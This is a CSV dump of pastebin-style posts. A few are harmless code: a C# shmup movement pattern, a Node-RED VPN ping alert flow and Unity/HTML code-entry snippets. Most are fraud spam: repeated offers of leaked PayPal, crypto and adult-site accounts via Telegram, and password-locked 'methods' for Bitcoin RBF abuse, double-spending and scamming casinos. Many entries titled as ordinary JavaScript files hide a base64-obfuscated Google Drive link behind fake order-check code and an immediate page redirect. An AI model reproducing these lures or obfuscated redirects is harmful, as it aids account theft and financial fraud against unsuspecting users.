id,title,username,language,date,content
4Kj1V7iU,EARN $900 INSTANTLY 2025 95,incognito___,JavaScript,Saturday 3rd of May 2025 12:29:57 PM CDT," 
Pdf https://tinyurl.com/freshleaks

P4zRGDvBNA
"
kCVESfYY,Movement Pattern Shmup Enemy,SilverTES,C#,Saturday 3rd of May 2025 12:27:03 PM CDT,"using Microsoft.Xna.Framework;
using System;
using System.Collections.Generic;

namespace ShootThemAll
{
    public enum CurveType
    {
        Linear,
        Bezier,
        Sinusoidal,
        Custom,
    }
    public class MovePattern
    {
        public List<Vector2> Waypoints { get; set; }
        public float Speed { get; set; }
        public bool Loop { get; set; }
        public CurveType CurveType { get; set; }
        public Func<float, Vector2> CustomTrajectory { get; set; } // Fonction personnalisée

        public Vector2 CalculatePosition(float progress)
        {
            switch (CurveType)
            {
                case CurveType.Linear:
                    return LinearInterpolation(progress);
                case CurveType.Bezier:
                    return BezierInterpolation(progress);
                case CurveType.Sinusoidal:
                    return SinusoidalMovement(progress);
                default:
                    return Waypoints[0]; // Fallback
            }
        }
        private Vector2 LinearInterpolation(float progress)
        {
            int startIndex = (int)(progress * (Waypoints.Count - 1));
            int endIndex = Math.Min(startIndex + 1, Waypoints.Count - 1);
            float segmentProgress = (progress * (Waypoints.Count - 1)) % 1;

            return Vector2.Lerp(Waypoints[startIndex], Waypoints[endIndex], segmentProgress);
        }

        private Vector2 BezierInterpolation(float progress)
        {
            if (Waypoints.Count < 2)
                return Vector2.Zero; // Pas assez de points pour une courbe

            // Normaliser le progrès entre 0 et 1
            float t = Math.Clamp(progress, 0f, 1f);
            int n = Waypoints.Count - 1; // Ordre de la courbe

            Vector2 result = Vector2.Zero;
            for (int i = 0; i <= n; i++)
            {
                // Calculer le coefficient binomial et le terme de la formule de Bézier
                float coefficient = BinomialCoefficient(n, i) * (float)Math.Pow(1 - t, n - i) * (float)Math.Pow(t, i);
                result += coefficient * Waypoints[i];
            }

            return result;
        }

        private static float BinomialCoefficient(int n, int k)
        {
            if (k < 0 || k > n) return 0;
            if (k == 0 || k == n) return 1;

            // Optimisation : utiliser la symétrie pour réduire les calculs
            k = Math.Min(k, n - k);
            float result = 1;
            for (int i = 1; i <= k; i++)
            {
                result *= (n - (k - i)) / (float)i;
            }
            return result;
        }


        private Vector2 SinusoidalMovement(float progress)
        {
            // Exemple : mouvement sinusoïdal autour d'un axe
            Vector2 basePos = LinearInterpolation(progress);
            float amplitude = 50f; // Paramétrable
            float frequency = 2f; // Paramétrable
            basePos.Y += (float)Math.Sin(progress * frequency * Math.PI) * amplitude;
            return basePos;
        }


    }
    //public class Wave
    //{
    //    private List<(float spawnTime, Enemy enemy)> _enemies = new();
    //    private float _timer;

    //    public void AddEnemy(float spawnTime, Enemy enemy)
    //    {
    //        _enemies.Add((spawnTime, enemy));
    //    }

    //    public void Update(GameTime gameTime, List<Enemy> activeEnemies)
    //    {
    //        _timer += (float)gameTime.ElapsedGameTime.TotalSeconds;

    //        foreach (var (spawnTime, enemy) in _enemies)
    //        {
    //            if (_timer >= spawnTime && !activeEnemies.Contains(enemy))
    //            {
    //                activeEnemies.Add(enemy);
    //            }
    //        }

    //        foreach (var enemy in activeEnemies)
    //        {
    //            enemy.Update(gameTime);
    //        }
    //    }
    //}

}
"
VugywiPj,VPN PING,Michael_ich,JSON,Saturday 3rd of May 2025 12:23:14 PM CDT,"[
    {
        ""id"": ""send_off_msg"",
        ""type"": ""function"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Send offline message"",
        ""func"": ""msg.payload = {chatId: АйДи, type: 'message', content: 'На даче нет интернета'};\nreturn msg;"",
        ""outputs"": 1,
        ""timeout"": """",
        ""noerr"": 1,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 820,
        ""y"": 620,
        ""wires"": [
            [
                ""telegram_send""
            ]
        ]
    },
    {
        ""id"": ""send_on_msg"",
        ""type"": ""function"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Send online message"",
        ""func"": ""msg.payload = {chatId: АйДи, type: 'message', content: 'На даче появился интернет'};\nreturn msg;"",
        ""outputs"": 1,
        ""timeout"": """",
        ""noerr"": 1,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 820,
        ""y"": 680,
        ""wires"": [
            [
                ""telegram_send""
            ]
        ]
    },
    {
        ""id"": ""4d32c92d13298bfa"",
        ""type"": ""server-state-changed"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Ping state change"",
        ""server"": ""9255c353.0ab86"",
        ""version"": 5,
        ""outputs"": 1,
        ""exposeAsEntityConfig"": """",
        ""entityId"": ""binary_sensor.192_168_2_10"",
        ""entityIdType"": ""exact"",
        ""outputInitially"": false,
        ""stateType"": ""str"",
        ""ifState"": """",
        ""ifStateType"": ""str"",
        ""ifStateOperator"": ""is"",
        ""outputOnlyOnStateChange"": true,
        ""for"": """",
        ""forType"": ""num"",
        ""forUnits"": ""minutes"",
        ""ignorePrevStateNull"": false,
        ""ignorePrevStateUnknown"": false,
        ""ignorePrevStateUnavailable"": false,
        ""ignoreCurrentStateUnknown"": false,
        ""ignoreCurrentStateUnavailable"": false,
        ""outputProperties"": [
            {
                ""property"": ""payload"",
                ""propertyType"": ""msg"",
                ""value"": """",
                ""valueType"": ""entityState""
            },
            {
                ""property"": ""data"",
                ""propertyType"": ""msg"",
                ""value"": """",
                ""valueType"": ""eventData""
            },
            {
                ""property"": ""topic"",
                ""propertyType"": ""msg"",
                ""value"": """",
                ""valueType"": ""triggerId""
            }
        ],
        ""x"": 130,
        ""y"": 640,
        ""wires"": [
            [
                ""state_switch""
            ]
        ]
    },
    {
        ""id"": ""state_switch"",
        ""type"": ""switch"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""On / Off?"",
        ""property"": ""payload"",
        ""propertyType"": ""msg"",
        ""rules"": [
            {
                ""t"": ""eq"",
                ""v"": ""off"",
                ""vt"": ""str""
            },
            {
                ""t"": ""eq"",
                ""v"": ""on"",
                ""vt"": ""str""
            }
        ],
        ""checkall"": ""true"",
        ""repair"": false,
        ""outputs"": 2,
        ""x"": 330,
        ""y"": 640,
        ""wires"": [
            [
                ""off_trigger""
            ],
            [
                ""cb7c6fd8bff030b0"",
                ""e112e5210755c8d7""
            ]
        ]
    },
    {
        ""id"": ""set_offline_flag"",
        ""type"": ""change"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""flow.wasOffline = true"",
        ""rules"": [
            {
                ""t"": ""set"",
                ""p"": ""wasOffline"",
                ""pt"": ""flow"",
                ""to"": ""true"",
                ""tot"": ""bool""
            }
        ],
        ""x"": 820,
        ""y"": 580,
        ""wires"": [
            []
        ]
    },
    {
        ""id"": ""off_trigger"",
        ""type"": ""trigger"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Wait 15s (confirm offline)"",
        ""op1"": """",
        ""op2"": ""offline"",
        ""op1type"": ""nul"",
        ""op2type"": ""str"",
        ""duration"": ""15"",
        ""extend"": false,
        ""overrideDelay"": false,
        ""units"": ""s"",
        ""reset"": ""on"",
        ""bytopic"": ""all"",
        ""topic"": ""topic"",
        ""outputs"": 1,
        ""x"": 560,
        ""y"": 600,
        ""wires"": [
            [
                ""set_offline_flag"",
                ""send_off_msg""
            ]
        ]
    },
    {
        ""id"": ""clear_offline_flag"",
        ""type"": ""change"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""flow.wasOffline = false"",
        ""rules"": [
            {
                ""t"": ""set"",
                ""p"": ""wasOffline"",
                ""pt"": ""flow"",
                ""to"": ""false"",
                ""tot"": ""bool""
            }
        ],
        ""x"": 820,
        ""y"": 720,
        ""wires"": [
            []
        ]
    },
    {
        ""id"": ""cb7c6fd8bff030b0"",
        ""type"": ""change"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": """",
        ""rules"": [
            {
                ""t"": ""set"",
                ""p"": ""reset"",
                ""pt"": ""msg"",
                ""to"": ""1"",
                ""tot"": ""num""
            }
        ],
        ""action"": """",
        ""property"": """",
        ""from"": """",
        ""to"": """",
        ""reg"": false,
        ""x"": 580,
        ""y"": 660,
        ""wires"": [
            [
                ""off_trigger""
            ]
        ]
    },
    {
        ""id"": ""e112e5210755c8d7"",
        ""type"": ""function"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": ""Проверка Was offline?"",
        ""func"": ""if (flow.get(\""wasOffline\"") === true || flow.get(\""wasOffline\"") === undefined) {\n    return [msg, null];\n}\nreturn [null, msg];"",
        ""outputs"": 2,
        ""timeout"": """",
        ""noerr"": 0,
        ""initialize"": """",
        ""finalize"": """",
        ""libs"": [],
        ""x"": 580,
        ""y"": 720,
        ""wires"": [
            [
                ""send_on_msg"",
                ""clear_offline_flag""
            ],
            []
        ]
    },
    {
        ""id"": ""telegram_send"",
        ""type"": ""telegram sender"",
        ""z"": ""81ba8bbcce571057"",
        ""name"": """",
        ""bot"": ""fb3719f3.7be288"",
        ""haserroroutput"": false,
        ""outputs"": 1,
        ""x"": 1070,
        ""y"": 660,
        ""wires"": [
            []
        ]
    }
]"
jfsEWu5z,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Saturday 3rd of May 2025 12:22:57 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 76440
jSpez8jN,Untitled,SpawnKz,JavaScript,Saturday 3rd of May 2025 12:22:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55834/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DciAq73G,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 12:22:49 PM CDT,22338 Accounts Posted On https://t.me/leakzbyeminem
cKHW59pY,Make $1000 15-MINUTES (BEGINNER) L4,incognito___,JavaScript,Saturday 3rd of May 2025 12:20:43 PM CDT," 
Pdf https://tinyurl.com/freshleaks

bAgPZ1msZ0
"
KY4Jz3b6,EARN $900 INSTANTLY 2025⭐ GV,incognito___,JavaScript,Saturday 3rd of May 2025 12:11:29 PM CDT," 
Pdf https://tinyurl.com/freshleaks

EPUxvwrH7Z
"
tCS1RXXp,Stake Free Balance Method,WantingTrae,JavaScript,Saturday 3rd of May 2025 12:07:36 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 95307
5UKHbS4j,Products.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 12:07:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26164/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
neJpiXjf,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 12:07:28 PM CDT,19254 Accounts Posted On https://t.me/leakzbyeminem
URHjg8jn,Scam Casinos and Stores,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:52:13 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 17540
1TrsNX4A,Order.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:52:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42094/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G4ixAm1C,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:52:06 AM CDT,99138 Accounts Posted On https://t.me/leakzbyeminem
AdMSdScJ,Code Entry Manager,MatiGe,C#,Saturday 3rd of May 2025 11:40:47 AM CDT,"using UnityEngine;
using UnityEngine.UI;
using TMPro;
using UnityEngine.SceneManagement;

public class CodeEntryManager : MonoBehaviour
{
    public InputField codeInputField;
    public Button submitButton;
    public string correctCode = ""TESTCODE""; // **Important: Replace with a temporary test code**
    public string nextSceneName = ""GameScene""; // Assuming your game scene is named ""GameScene""

    void Start()
    {
        if (codeInputField == null || submitButton == null)
        {
            Debug.LogError(""One or more UI elements are not assigned in the Inspector!"");
            enabled = false;
            return;
        }

        submitButton.onClick.AddListener(CheckCode);
    }

    void CheckCode()
    {
        if (codeInputField.text == correctCode)
        {
            Invoke(""LoadNextScene"", 1f);
        }
        else
        {
            codeInputField.text = """";
        }
    }

    void LoadNextScene()
    {
        SceneManager.LoadScene(nextSceneName);
    }
}"
uA07xy0b,index,MatiGe,HTML,Saturday 3rd of May 2025 11:37:00 AM CDT,"<!DOCTYPE html>
<html>

<head>
    <title>Code Generator</title>
    <style>
        body {
            font-family: sans-serif;
            text-align: center;
        }

        #generatedCode {
            font-size: 2em;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <h1>Your Secret Code</h1>
    <div id=""generatedCode""></div>
    <button onclick=""generateCode()"">Generate New Code</button>

    <script>
        function generateCode() {
            const length = 8;
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let code = '';
            for (let i = 0; i < length; i++) {
                code += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            document.getElementById('generatedCode').innerText = code;
            // You might want to store this code somewhere if you need server-side verification
            console.log(""Generated Code:"", code);
        }

        // Generate an initial code when the page loads
        generateCode();
    </script>
</body>

</html>"
eds7bBSX,Market.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:36:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05658/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z9MgaksX,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:36:50 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 94155
6jg5kKir,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:36:44 AM CDT,53867 Accounts Posted On https://t.me/leakzbyeminem
RM9FRCDh,Untitled,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:21:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11497/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
DPAr5Uq3,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:21:27 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 39318
FJ4jn1W9,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:21:22 AM CDT,86155 Accounts Posted On https://t.me/leakzbyeminem
Du8ShK9e,Products.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 11:06:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27294/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kDP1CqM4,Stake Free Balance Method,WantingTrae,JavaScript,Saturday 3rd of May 2025 11:06:05 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 03291
hmQWDPXb,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 11:06:01 AM CDT,68955 Accounts Posted On https://t.me/leakzbyeminem
ckUPY69v,Scam Casinos and Stores,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:50:45 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 10434
GCTitTcP,Order.js,SpawnKz,JavaScript,Saturday 3rd of May 2025 10:50:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84409/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
82sATZdd,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 10:50:39 AM CDT,87059 Accounts Posted On https://t.me/leakzbyeminem
zTEn9Shh,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:35:22 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 18331
yBXacYQy,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 3rd of May 2025 10:35:17 AM CDT,73297 Accounts Posted On https://t.me/leakzbyeminem
FeJabTJz,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Saturday 3rd of May 2025 10:19:58 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 54830
